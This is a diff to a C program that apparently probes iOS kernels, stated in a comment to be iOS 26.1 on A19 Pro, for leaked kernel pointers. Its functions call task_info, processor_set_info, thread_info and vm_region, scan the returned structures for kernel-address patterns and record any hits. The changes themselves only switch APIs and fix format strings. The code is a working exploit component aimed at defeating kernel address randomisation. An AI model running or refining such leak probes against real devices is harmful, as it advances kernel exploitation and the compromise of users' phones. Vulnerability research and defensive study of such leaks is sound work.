@@ -18,13 +18,13 @@
 #include <stdint.h>
 #include <unistd.h>
 #include <mach/mach.h>
-#include <mach/mach_vm.h>
 #include <mach/host_info.h>
 #include <mach/task_info.h>
 #include <mach/vm_statistics.h>
 #include <mach/mach_host.h>
 #include <mach/processor_info.h>
 #include <mach/thread_info.h>
+#include <mach/vm_map.h>
 
 /* Kernel address patterns for iOS 26.1 on A19 Pro */
 #define KERNEL_BASE_MASK        0xFFFFFFF000000000ULL
@@ -138,8 +138,8 @@ int leak_via_task_info(void) {
     kern_return_t kr = task_info(g_leak.task_self, TASK_BASIC_INFO,
                                   (task_info_t)&basic_info, &count);
     if (kr == KERN_SUCCESS) {
-        printf("  Virtual size: %llu MB\n", basic_info.virtual_size / (1024*1024));
-        printf("  Resident size: %llu MB\n", basic_info.resident_size / (1024*1024));
+        printf("  Virtual size: %lu MB\n", (unsigned long)(basic_info.virtual_size / (1024*1024)));
+        printf("  Resident size: %lu MB\n", (unsigned long)(basic_info.resident_size / (1024*1024)));
         printf("  Suspend count: %d\n", basic_info.suspend_count);
         
         /* Check for leaked pointers in padding */
@@ -305,8 +305,6 @@ int leak_via_processor_info(void) {
         
         if (kr == KERN_SUCCESS) {
             printf("  Processor count: %d\n", pset_info.processor_count);
-            printf("  Task count: %d\n", pset_info.task_count);
-            printf("  Thread count: %d\n", pset_info.thread_count);
         }
         
         mach_port_deallocate(g_leak.task_self, pset);
@@ -369,19 +367,19 @@ int leak_via_thread_info(void) {
 int leak_via_vm_region(void) {
     printf("\n[*] Probing vm_region...\n");
     
-    mach_vm_address_t address = 0;
-    mach_vm_size_t size;
-    vm_region_basic_info_data_64_t info;
-    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
+    vm_address_t address = 0;
+    vm_size_t size;
+    vm_region_basic_info_data_t info;
+    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT;
     mach_port_t object_name;
     
     int regions = 0;
     
     while (1) {
-        kern_return_t kr = mach_vm_region(g_leak.task_self, &address, &size,
-                                           VM_REGION_BASIC_INFO_64,
-                                           (vm_region_info_t)&info, &count,
-                                           &object_name);
+        kern_return_t kr = vm_region(g_leak.task_self, &address, &size,
+                                      VM_REGION_BASIC_INFO,
+                                      (vm_region_info_t)&info, &count,
+                                      &object_name);
         
         if (kr != KERN_SUCCESS) break;
         
@@ -391,7 +389,7 @@ int leak_via_vm_region(void) {
         if (info.protection & VM_PROT_EXECUTE) {
             /* Executable regions are interesting */
             uint64_t *raw = (uint64_t *)&info;
-            for (int i = 0; i < sizeof(info) / sizeof(uint64_t); i++) {
+            for (size_t i = 0; i < sizeof(info) / sizeof(uint64_t); i++) {
                 if (is_kernel_pointer(raw[i])) {
                     record_leak(raw[i], "vm_region", 35);
                 }
